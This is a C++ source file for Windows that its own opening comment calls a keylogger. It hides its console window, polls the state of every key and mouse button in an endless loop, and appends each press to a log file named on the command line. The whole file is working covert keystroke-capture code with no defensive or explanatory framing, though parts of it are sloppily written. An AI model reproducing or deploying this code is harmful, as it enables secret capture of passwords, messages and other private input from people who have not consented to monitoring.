// This is literally a keylogger wtf

#include <iostream>
#include <Windows.h>
#include <string>

using namespace std;

int Save(int _key, char *file, int slptm);

//accepts an int and a string. example:
//keymapper.exe 10 keymapper.txt
int main(int argc, char **argv)
{

    FreeConsole();

    char i;

    int timesleep = stoi(argv[1]);

    while (true)
    {
        Sleep(timesleep);
        for (i = 8; i <= 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                Save(i, argv[2], timesleep);
            }
        }
    }
    return 0;
}

int Save(int _key, char *file, int slptm)
{

    cout << _key << endl;

    Sleep(slptm);

    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a+");

    //Mouse Buttons
    if (_key == VK_LBUTTON)
    {
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]\n");
    }
    else if (_key == VK_RBUTTON)
    {
        fprintf(OUTPUT_FILE, "%s", "[RBUTTON]\n");
    }
    else if (_key == VK_MBUTTON)
    {
        fprintf(OUTPUT_FILE, "%s", "[MBUTTON]\n");
    }

    //General Keyboard
    else if (_key == VK_BACK)
    {
        fprintf(OUTPUT_FILE, "%s", "[BACK]\n");
    }
    else if (_key == VK_TAB)
    {
        fprintf(OUTPUT_FILE, "%s", "[TAB]\n");
    }
    else if (_key == VK_RETURN)
    {
        fprintf(OUTPUT_FILE, "%s", "[RETURN]\n");
    }
    else if (_key == VK_SHIFT)
    {
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]\n");
    }
    else if (_key == VK_CONTROL)
    {
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]\n");
    }
    else if (_key == VK_MENU)
    {
        fprintf(OUTPUT_FILE, "%s", "[ALT]\n");
    }
    else if (_key == VK_PAUSE)
    {
        fprintf(OUTPUT_FILE, "%s", "[PAUSE]\n");
    }
    else if (_key == VK_ESCAPE)
    {
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]\n");
    }
    else if (_key == VK_SPACE)
    {
        fprintf(OUTPUT_FILE, "%s", "[SPACE]\n");
    }
    else if (_key == VK_SELECT)
    {
        fprintf(OUTPUT_FILE, "%s", "[SELECT]\n");
    }
    else if (_key == VK_PRINT)
    {
        fprintf(OUTPUT_FILE, "%s", "[PRINT]\n");
    }
    else if (_key == VK_EXECUTE)
    {
        fprintf(OUTPUT_FILE, "%s", "[EXECUTE]\n");
    }
    else if (_key == VK_SNAPSHOT)
    {
        fprintf(OUTPUT_FILE, "%s", "[SNAPSHOT]\n");
    }
    else if (_key == VK_HELP)
    {
        fprintf(OUTPUT_FILE, "%s", "[HELP]\n");
    }
    else if (_key == VK_LWIN)
    {
        fprintf(OUTPUT_FILE, "%s", "[LWIN]\n");
    }
    else if (_key == VK_RWIN)
    {
        fprintf(OUTPUT_FILE, "%s", "[RWIN]\n");
    }
    else if (_key == VK_APPS)
    {
        fprintf(OUTPUT_FILE, "%s", "[APPS]\n");
    }
    else if (_key == VK_SLEEP)
    {
        fprintf(OUTPUT_FILE, "%s", "[SLEEP]\n");
    }

    //Island keys
    else if (_key == VK_PRIOR)
    {
        fprintf(OUTPUT_FILE, "%s", "[PRIOR]\n");
    }
    else if (_key == VK_NEXT)
    {
        fprintf(OUTPUT_FILE, "%s", "[NEXT]\n");
    }
    else if (_key == VK_END)
    {
        fprintf(OUTPUT_FILE, "%s", "[END]\n");
    }
    else if (_key == VK_HOME)
    {
        fprintf(OUTPUT_FILE, "%s", "[HOME]\n");
    }
    else if (_key == VK_DELETE)
    {
        fprintf(OUTPUT_FILE, "%s", "[DELETE]\n");
    }
    else if (_key == VK_INSERT)
    {
        fprintf(OUTPUT_FILE, "%s", "[INSERT]\n");
    }

    //Arrow keys
    else if (_key == VK_LEFT)
    {
        fprintf(OUTPUT_FILE, "%s", "[LEFT]\n");
    }
    else if (_key == VK_UP)
    {
        fprintf(OUTPUT_FILE, "%s", "[UP]\n");
    }
    else if (_key == VK_RIGHT)
    {
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]\n");
    }
    else if (_key == VK_DOWN)
    {
        fprintf(OUTPUT_FILE, "%s", "[DOWN]\n");
    }

    //Numpad
    else if (_key == VK_NUMPAD0)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD0]\n");
    }
    else if (_key == VK_NUMPAD1)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD1]\n");
    }
    else if (_key == VK_NUMPAD2)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD2]\n");
    }
    else if (_key == VK_NUMPAD3)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD3]\n");
    }
    else if (_key == VK_NUMPAD4)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD4]\n");
    }
    else if (_key == VK_NUMPAD5)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD5]\n");
    }
    else if (_key == VK_NUMPAD6)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD6]\n");
    }
    else if (_key == VK_NUMPAD7)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD7]\n");
    }
    else if (_key == VK_NUMPAD8)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD8]\n");
    }
    else if (_key == VK_NUMPAD9)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMPAD9]\n");
    }

    else if (_key == VK_MULTIPLY)
    {
        fprintf(OUTPUT_FILE, "%s", "[MULTIPLY]\n");
    }
    else if (_key == VK_ADD)
    {
        fprintf(OUTPUT_FILE, "%s", "[ADD]\n");
    }
    else if (_key == VK_SUBTRACT)
    {
        fprintf(OUTPUT_FILE, "%s", "[SUBTRACT]\n");
    }
    else if (_key == VK_DECIMAL)
    {
        fprintf(OUTPUT_FILE, "%s", "[DECIMAL]\n");
    }
    else if (_key == VK_DIVIDE)
    {
        fprintf(OUTPUT_FILE, "%s", "[DIVIDE]\n");
    }

    //F keys
    else if (_key == VK_F1)
    {
        fprintf(OUTPUT_FILE, "%s", "[F1]\n");
    }
    else if (_key == VK_F2)
    {
        fprintf(OUTPUT_FILE, "%s", "[F2]\n");
    }
    else if (_key == VK_F3)
    {
        fprintf(OUTPUT_FILE, "%s", "[F3]\n");
    }
    else if (_key == VK_F4)
    {
        fprintf(OUTPUT_FILE, "%s", "[F4]\n");
    }
    else if (_key == VK_F5)
    {
        fprintf(OUTPUT_FILE, "%s", "[F5]\n");
    }
    else if (_key == VK_F6)
    {
        fprintf(OUTPUT_FILE, "%s", "[F6]\n");
    }
    else if (_key == VK_F7)
    {
        fprintf(OUTPUT_FILE, "%s", "[F7]\n");
    }
    else if (_key == VK_F8)
    {
        fprintf(OUTPUT_FILE, "%s", "[F8]\n");
    }
    else if (_key == VK_F9)
    {
        fprintf(OUTPUT_FILE, "%s", "[F9]\n");
    }
    else if (_key == VK_F10)
    {
        fprintf(OUTPUT_FILE, "%s", "[F10]\n");
    }
    else if (_key == VK_F11)
    {
        fprintf(OUTPUT_FILE, "%s", "[F11]\n");
    }
    else if (_key == VK_F12)
    {
        fprintf(OUTPUT_FILE, "%s", "[F12]\n");
    }

    //Locks
    else if (_key == VK_CAPITAL)
    {
        fprintf(OUTPUT_FILE, "%s", "[CAPS]\n");
    }
    else if (_key == VK_NUMLOCK)
    {
        fprintf(OUTPUT_FILE, "%s", "[NUMLOCK]\n");
    }
    else if (_key == VK_SCROLL)
    {
        fprintf(OUTPUT_FILE, "%s", "[SCROLL]\n");
    }

    else
    {
        fprintf(OUTPUT_FILE, "%s", &_key);
        fprintf(OUTPUT_FILE, "%s", "\n");
    }
    fclose(OUTPUT_FILE);

    return 0;
}